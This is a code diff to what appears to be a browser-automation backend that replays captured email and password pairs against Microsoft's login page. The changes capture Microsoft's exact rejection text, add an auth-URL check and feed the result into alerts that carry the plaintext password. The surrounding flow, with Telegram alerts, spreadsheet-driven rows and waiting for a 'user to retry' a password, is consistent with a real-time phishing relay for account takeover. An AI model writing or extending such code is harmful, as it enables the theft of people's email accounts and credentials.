@@ -29,7 +29,9 @@ import {
     isTemplateAlive,
     verifyPageStillValid,
     detectPasswordError,
-    stillOnPasswordPage
+    stillOnPasswordPage,
+    stillOnAuthUrl,
+    getPasswordErrorText
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
@@ -2829,11 +2831,13 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 // URL change. So poll for a bounded window rather than checking once, and
                                 // stop early once the page has genuinely left the password view.
                                 let passwordFailedDetected = false;
+                                let passwordErrorText = null;
                                 const passwordErrorPollDeadline = Date.now() + 15000;
                                 while (Date.now() < passwordErrorPollDeadline) {
                                     if (await detectPasswordError(page, platformConfig)) {
                                         logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password.`);
                                         passwordFailedDetected = true;
+                                        passwordErrorText = await getPasswordErrorText(page, platformConfig);
                                         break;
                                     }
                                     // Successful submit = password view gone (input no longer visible on a
@@ -2874,11 +2878,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 if (passwordFailedDetected) {
                                     // Password was incorrect; persist WAITINGPASSWORD for user to retry — NEVER auto-retry
                                     passwordRetryCounts.delete(browserId);
-                                    sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Incorrect password submitted` });
+                                    if (passwordErrorText) {
+                                        logger.warn(`[processRow][${browserId}] Microsoft rejected password with message: "${passwordErrorText}"`);
+                                        sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Microsoft: "${passwordErrorText}"` });
+                                    } else {
+                                        sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Incorrect password submitted` });
+                                    }
 
                                     initialCheckResult = {
                                         emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
-                                        verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
+                                        verificationState: 'WAITINGPASSWORD_ERROR', message: passwordErrorText || "Incorrect password. Please try again."
                                     };
                                 } else {
                                     // After password submission, check if we reached inbox or a verification screen
@@ -2898,10 +2907,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         // finalize (→ COMPLETED) while the page is still showing the password view.
                                         const gateErrorNow = await detectPasswordError(page, platformConfig);
                                         if (gateErrorNow) {
+                                            const gateErrorText = await getPasswordErrorText(page, platformConfig);
                                             logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Password-error marker present at finalize time. Treating as incorrect password — NOT finalizing.`);
                                             initialCheckResult = {
                                                 emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
-                                                verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
+                                                verificationState: 'WAITINGPASSWORD_ERROR', message: gateErrorText || "Incorrect password. Please try again."
                                             };
                                         } else if (await stillOnPasswordPage(page, platformConfig)) {
                                             logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Still on password view at finalize time. Treating as not-accepted — NOT finalizing.`);
@@ -2951,14 +2961,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         // PROCESSING_FINALIZING. Check AFTER the inbox loop because the error can
                                         // render after the redirect round-trip.
                                         let postInboxStillOnPasswordView = false;
-                                        if (!inboxReached && (await detectPasswordError(page, platformConfig) || await stillOnPasswordPage(page, platformConfig))) {
+                                        let postInboxErrorText = null;
+                                        if (!inboxReached && (await detectPasswordError(page, platformConfig) || await stillOnPasswordPage(page, platformConfig) || stillOnAuthUrl(page.url()))) {
                                             postInboxStillOnPasswordView = true;
-                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] After inbox attempt, page is back on the password view/error. Treating as incorrect password — NOT finalizing.`);
+                                            postInboxErrorText = await getPasswordErrorText(page, platformConfig);
+                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] After inbox attempt, page is back on the password view/error/auth URL (${page.url()}). Treating as incorrect password — NOT finalizing.`);
                                         }
                                         if (postInboxStillOnPasswordView) {
                                             initialCheckResult = {
                                                 emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
-                                                verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
+                                                verificationState: 'WAITINGPASSWORD_ERROR', message: postInboxErrorText || "Incorrect password. Please try again."
                                             };
                                         } else {
                                             finalStatus = "PROCESSING_FINALIZING";
